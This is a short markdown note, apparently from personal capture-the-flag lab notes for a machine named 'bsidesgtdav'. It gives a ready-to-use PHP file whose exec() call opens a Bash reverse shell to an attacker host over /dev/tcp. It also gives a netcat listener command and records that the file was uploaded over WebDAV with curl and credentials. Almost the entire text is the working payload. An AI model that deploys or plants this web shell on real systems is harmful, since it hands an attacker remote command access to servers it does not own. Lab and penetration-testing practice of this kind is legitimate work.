# PHP `exec()` Bash Reverse Shell

Small PHP wrapper that executes a Bash reverse shell from a web-accessible PHP file.

Used on: **bsidesgtdav**

## Payload

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/8080 0>&1'");
?>
```

## Listener

```bash
nc -nlvp 8080
```

## Notes

- Replace `$LHOST` with the attacker VPN/IP before uploading if the target will not expand it server-side.
- This was uploaded through WebDAV with `curl -u USER:PASS -T reverse.php`.
- Keep the exact port from the writeup when documenting the chain; the port choice helps reconstruct the session later.

